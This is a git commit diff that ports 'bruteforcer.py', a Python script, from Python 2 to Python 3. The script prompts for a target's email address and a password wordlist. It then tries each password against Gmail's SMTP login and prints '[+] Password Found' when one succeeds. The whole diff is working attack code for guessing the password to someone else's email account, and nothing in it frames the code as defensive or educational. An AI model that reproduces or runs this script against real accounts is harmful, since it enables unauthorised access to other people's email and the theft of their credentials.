3e91cdc27fc8ae2ccd3fe8a1ae3e02d04c18b4dc
0vn <75097279+0vn@users.noreply.github.com>
2021-02-04 11:17:22 -0500

    update “bruteforcer.py” to python3

--- bruteforcer.py
+++ bruteforcer.py
@@ -4,18 +4,19 @@ smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
 smtpserver.ehlo()
 smtpserver.starttls()
  
-user = raw_input("Enter the target's email address: ")
-passwfile = raw_input("Enter the password file name: ")
+user = input("Enter the target's email address: ")
+passwfile = input("Enter the password file name: ")
 passwfile = open(passwfile, "r")
  
 for password in passwfile:
     try:
         smtpserver.login(user, password)
  
-        print "[+] Password Found: %s" % password
+        print("[+] Password Found: " + password)
         break;
     except smtplib.SMTPAuthenticationError:
-        print "[!] Password Incorrect: %s" % password
+        print("[!] Password Incorrect: " +password)
 
 
 #attemtion this works on python2 not on 3
+# ^ Now ported to py3 by 0vn
